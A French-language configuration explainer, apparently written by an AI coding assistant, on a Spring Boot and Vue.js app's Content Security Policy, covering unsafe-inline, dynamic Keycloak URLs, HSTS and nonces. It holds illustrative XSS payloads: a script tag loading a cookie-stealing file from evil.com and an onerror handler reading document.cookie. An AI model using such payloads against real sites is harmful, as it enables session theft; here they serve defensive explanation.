# 🔒 Content Security Policy (CSP) - Explications Détaillées

## 📋 Questions et Réponses

### 1. Pourquoi `unsafe-inline` et `unsafe-eval` sont-ils nécessaires ?

**Réponse:** Après analyse du code, ces directives sont **RÉELLEMENT NÉCESSAIRES** car l'application utilise:

#### Scripts Inline Détectés

**Fichier:** [frontend/dist/index.html](frontend/dist/index.html)

```html
<script>
  console.log('[DEBUG] HTML chargé, JS fonctionne');
  window.__VUE_DEBUG__ = true;
  window.__VUE_ERRORS__ = [];

  // Capturer les erreurs JavaScript
  window.addEventListener('error', function(e) {
    console.error('[ERROR]', e.message, e.filename, e.lineno, e.colno);
    window.__VUE_ERRORS__.push({
      message: e.message,
      file: e.filename,
      line: e.lineno,
      col: e.colno
    });
  });
</script>
```

**Raison:** Code de debug et gestion d'erreurs inline dans l'index.html généré par Vue.js.

#### Styles Inline Détectés

**Fichier 1:** [frontend/dist/index.html](frontend/dist/index.html)
```html
<div style="padding: 20px; text-align: center;">
  <p>⏳ Chargement de l'application...</p>
</div>
```

**Fichier 2:** [src/main/resources/templates/error.html](src/main/resources/templates/error.html)
```html
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f8d7da;
    color: #721c24;
    margin: 30px;
  }
  h1 { color: #d9534f; }
  /* ... */
</style>
```

**Raison:** Page d'erreur avec styles inline pour fonctionner même si les CSS externes échouent.

#### Framework Vue.js

**Pourquoi `unsafe-eval` ?**
Vue.js (framework frontend) peut utiliser `eval()` pour:
- Compiler les templates à la volée
- Exécuter les expressions dans les templates (`{{ expression }}`)
- Évaluer dynamiquement certaines directives

**Alternative future:** Utiliser Vue.js en mode "runtime-only" (sans compiler) pour éliminer `unsafe-eval`.

---

### 2. Pourquoi ne pas mettre l'URL Keycloak en dur ?

**Réponse:** Excellente question! L'URL Keycloak change selon l'environnement:

| Environnement | URL Keycloak | Configuration |
|---------------|-------------|---------------|
| **Local** | `http://localhost:6090` | application.yml |
| **Staging** | `https://keycloak.staging.local` | application-staging.yml |
| **Production** | `https://keycloak.production.company.com` | Variables d'environnement |

**Solution implémentée:** CSP dynamique qui extrait automatiquement l'URL depuis la configuration OAuth2.

#### Comment ça fonctionne

**Fichier:** [SecurityConfig.java](src/main/java/fr/leuwen/rhdemoAPI/springconfig/SecurityConfig.java)

```java
// Injection de la configuration OAuth2 existante
@Value("${spring.security.oauth2.client.provider.keycloak.authorization-uri:}")
private String keycloakAuthorizationUri;

// Extraction automatique de l'URL de base
private String extractKeycloakBaseUrl() {
    // "https://keycloak.staging.local/realms/RHDemo/protocol/openid-connect/auth"
    // devient
    // "https://keycloak.staging.local"
    java.net.URI uri = java.net.URI.create(keycloakAuthorizationUri);
    return uri.getScheme() + "://" + uri.getHost() + ...;
}

// Génération dynamique de la CSP
private String buildCspDirectives() {
    String keycloakBaseUrl = extractKeycloakBaseUrl();
    // connect-src 'self' https://keycloak.staging.local;
    // form-action 'self' https://keycloak.staging.local;
}
```

**Avantages:**
- ✅ **Une seule source de vérité:** L'URL Keycloak est définie dans `application.yml` uniquement
- ✅ **Pas de duplication:** Pas besoin de configurer l'URL à deux endroits
- ✅ **Multi-environnement:** Fonctionne automatiquement en dev, staging, prod
- ✅ **Maintenance facilitée:** Changer l'URL Keycloak = modifier application.yml uniquement

---

### 3. À quoi sert `upgrade-insecure-requests` ?

**Directive CSP:** `upgrade-insecure-requests`

#### Explication

Cette directive **force le navigateur à upgrader automatiquement toutes les requêtes HTTP en HTTPS**.

**Exemple concret:**

Sans `upgrade-insecure-requests`:
```html
<!-- Dans votre HTML -->
<img src="http://example.com/image.jpg">
<!-- Le navigateur télécharge via HTTP (non sécurisé) -->
```

Avec `upgrade-insecure-requests`:
```html
<!-- Dans votre HTML -->
<img src="http://example.com/image.jpg">
<!-- Le navigateur upgrade automatiquement en HTTPS -->
<!-- Requête réelle: https://example.com/image.jpg -->
```

#### Pourquoi je l'ai RETIRÉ dans votre cas

**Problème:** Votre application fonctionne en **développement local (HTTP)** et **staging/production (HTTPS)**.

Avec `upgrade-insecure-requests`:
- ✅ **Production (HTTPS):** Fonctionne parfaitement
- ❌ **Développement local (HTTP):** CASSE l'application!

**Exemple du problème:**

En développement local (`http://localhost:9000`):
```
application.yml (dev):
  authorization-uri: http://localhost:6090/realms/RHDemo/...
```

Avec `upgrade-insecure-requests`, le navigateur transforme:
```
http://localhost:6090/realms/RHDemo/...
↓
https://localhost:6090/realms/RHDemo/...  ← ❌ Keycloak local ne supporte pas HTTPS!
```

**Résultat:** Erreur de connexion en développement local.

#### Alternatives pour forcer HTTPS

**Option 1: Header HSTS (déjà implémenté dans Nginx)**

```nginx
# infra/staging/nginx/conf.d/rhdemo.conf
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

**Avantages:**
- ✅ Force HTTPS pour le domaine entier
- ✅ Fonctionne uniquement en HTTPS (pas de conflit avec HTTP local)
- ✅ Plus puissant que `upgrade-insecure-requests`

**Option 2: Redirection HTTP → HTTPS dans Nginx**

```nginx
# Déjà implémenté dans vos configurations Nginx
server {
    listen 80;
    server_name rhdemo.staging.local;
    location / {
        return 301 https://$server_name$request_uri;
    }
}
```

**Option 3: CSP conditionnelle selon l'environnement**

```java
// Dans buildCspDirectives()
@Value("${server.ssl.enabled:false}")
private boolean sslEnabled;

if (sslEnabled) {
    csp.append("; upgrade-insecure-requests");
}
```

**Recommandation:** Utiliser **HSTS (Option 1)** qui est déjà en place via Nginx. C'est suffisant et plus robuste.

---

## 🔐 Résumé de la Configuration CSP Finale

### Directives Implémentées

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' https://keycloak.[ENV].local;
  frame-src 'self';
  frame-ancestors 'self';
  form-action 'self' https://keycloak.[ENV].local;
  object-src 'none';
  base-uri 'self'
```

### Explication de Chaque Directive

| Directive | Valeur | Justification |
|-----------|--------|---------------|
| `default-src` | `'self'` | Par défaut, tout doit venir du même domaine |
| `script-src` | `'self' 'unsafe-inline' 'unsafe-eval'` | Scripts locaux + inline (Vue.js debug) + eval (Vue.js runtime) |
| `style-src` | `'self' 'unsafe-inline'` | Styles locaux + inline (error.html + Vue.js) |
| `img-src` | `'self' data: https:` | Images locales + data URIs (base64) + HTTPS externe |
| `font-src` | `'self' data:` | Polices locales + data URIs |
| `connect-src` | `'self' + Keycloak` | AJAX vers l'app + Keycloak (extrait dynamiquement) |
| `frame-src` | `'self'` | iframes uniquement du même domaine |
| `frame-ancestors` | `'self'` | Empêche l'embedding (protection clickjacking) |
| `form-action` | `'self' + Keycloak` | Formulaires vers l'app + Keycloak OAuth2 |
| `object-src` | `'none'` | Interdit Flash, Java applets |
| `base-uri` | `'self'` | Empêche injection de `<base href>` |

### Protection Offerte

✅ **Protection contre XSS (Cross-Site Scripting):**
- Bloque l'injection de scripts externes
- Empêche l'exécution de code depuis des domaines non autorisés

✅ **Protection contre Clickjacking:**
- `frame-ancestors 'self'` empêche l'embedding dans d'autres sites

✅ **Protection contre Data Injection:**
- Contrôle strict des sources de données (images, fonts, etc.)

⚠️ **Limitations (dues à `unsafe-inline` et `unsafe-eval`):**
- Un attaqueur qui injecte du code inline peut l'exécuter
- Recommandation: Migrer vers des **nonces** ou **hashes** pour éliminer `unsafe-inline`

---

## 🚀 Amélioration Future: Éliminer `unsafe-inline` avec Nonces

### Principe

Au lieu de:
```
script-src 'self' 'unsafe-inline';
```

Utiliser:
```
script-src 'self' 'nonce-xyz123';
```

Et dans le HTML:
```html
<script nonce="xyz123">
  console.log('Script autorisé via nonce');
</script>
```

### Implémentation avec Spring Boot

**1. Générer un nonce unique par requête**

```java
@Component
public class CspNonceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) {
        // Générer un nonce aléatoire
        String nonce = UUID.randomUUID().toString();

        // Stocker dans l'attribut de requête
        request.setAttribute("cspNonce", nonce);

        // Ajouter le header CSP avec le nonce
        response.setHeader("Content-Security-Policy",
            "script-src 'self' 'nonce-" + nonce + "'; ...");

        filterChain.doFilter(request, response);
    }
}
```

**2. Injecter le nonce dans les templates Thymeleaf**

```html
<!-- error.html -->
<script th:attr="nonce=${cspNonce}">
  // Code inline autorisé
</script>
```

**3. Modifier Vue.js pour utiliser des scripts externes**

Au lieu de:
```html
<script>
  window.__VUE_DEBUG__ = true;
</script>
```

Externaliser:
```html
<script src="/js/vue-init.js"></script>
```

**Complexité:** Moyenne (nécessite refactoring du frontend)

**Bénéfice:** Élimine complètement le risque d'injection de scripts inline

---

## 📊 Comparaison: Avec/Sans CSP

### Scénario d'Attaque: XSS via Commentaire Utilisateur

**Sans CSP:**

```javascript
// Un attaquant injecte ce code dans un commentaire:
<script src="https://evil.com/steal-cookies.js"></script>

// Le navigateur exécute le script malveillant
// → Vol de cookies de session
// → Redirection vers un site de phishing
```

**Avec CSP (notre configuration):**

```javascript
// Le navigateur BLOQUE le script externe
// Console: "Refused to load script 'https://evil.com/steal-cookies.js'
//          because it violates the Content-Security-Policy directive:
//          'script-src 'self' 'unsafe-inline' 'unsafe-eval''"

// ✅ L'attaque est bloquée
```

**Limitation (unsafe-inline):**

```javascript
// Un attaquant injecte ce code inline:
<img src=x onerror="alert(document.cookie)">

// Avec 'unsafe-inline', ce code PEUT s'exécuter
// ❌ L'attaque réussit
```

**Solution:** Éliminer `unsafe-inline` avec des nonces (voir section précédente).

---

## 🧪 Tests de Validation CSP

### Test 1: Vérifier la CSP dans les Headers

**Commande:**
```bash
curl -I https://rhdemo.staging.local/front/

# Attendu:
# Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ...
```

### Test 2: Vérifier que Keycloak est extrait dynamiquement

**Action:**
1. Démarrer l'application
2. Consulter les logs Spring Boot

**Attendu dans les logs:**
```
CSP directive: connect-src 'self' https://keycloak.staging.local;
CSP directive: form-action 'self' https://keycloak.staging.local;
```

### Test 3: Tester le Blocage d'un Script Externe

**1. Ouvrir la console navigateur (F12)**

**2. Essayer d'injecter un script externe:**
```javascript
var script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);
```

**3. Résultat attendu:**
```
🚫 Refused to load the script 'https://evil.com/malicious.js'
   because it violates the following Content Security Policy directive:
   "script-src 'self' 'unsafe-inline' 'unsafe-eval'"
```

### Test 4: Vérifier que les Scripts Inline Fonctionnent

**1. Ouvrir https://rhdemo.staging.local/front/**

**2. Vérifier dans la console:**
```
[DEBUG] HTML chargé, JS fonctionne  ← ✅ Script inline autorisé
```

**3. Aller sur https://rhdemo.staging.local/error (page d'erreur)**

**4. Vérifier que le CSS inline fonctionne:**
```
✅ La page d'erreur s'affiche avec le style rouge/rose
```

---

## 📚 Références

### Standards et Documentation

- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [W3C CSP Level 3](https://www.w3.org/TR/CSP3/)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/) - Outil pour analyser votre CSP

### Articles sur `upgrade-insecure-requests`

- [CSP: upgrade-insecure-requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/upgrade-insecure-requests)
- [HSTS vs upgrade-insecure-requests](https://web.dev/articles/fixing-mixed-content)

### Outils de Test

**1. Browser DevTools:**
```
Chrome/Firefox: F12 → Console
Rechercher: "Content Security Policy"
```

**2. CSP Analyzer:**
```bash
# Installer l'outil CSP
npm install -g csp-validator

# Tester votre CSP
csp-validator https://rhdemo.staging.local
```

**3. Report URI (Service de monitoring CSP):**
```
https://report-uri.com/
```

---

## ✅ Checklist de Déploiement

Avant de déployer en production:

- [ ] **Tester la CSP en staging** avec des navigateurs différents (Chrome, Firefox, Safari)
- [ ] **Vérifier les logs de la console** pour détecter les violations CSP
- [ ] **Tester le login OAuth2** avec Keycloak pour s'assurer que `form-action` et `connect-src` fonctionnent
- [ ] **Vérifier que l'URL Keycloak** est correctement extraite dans les logs
- [ ] **Tester la page d'erreur** pour s'assurer que le CSS inline fonctionne
- [ ] **Vérifier l'application frontend Vue.js** pour s'assurer que les scripts inline fonctionnent
- [ ] **Configurer un reporting CSP** (optionnel) avec `report-uri` ou `report-to`

---

**Auteur:** Claude Code
**Date:** 2025-12-06
**Version:** 1.0
**Fichiers modifiés:** SecurityConfig.java
**Status:** ✅ Configuration dynamique implémentée et documentée
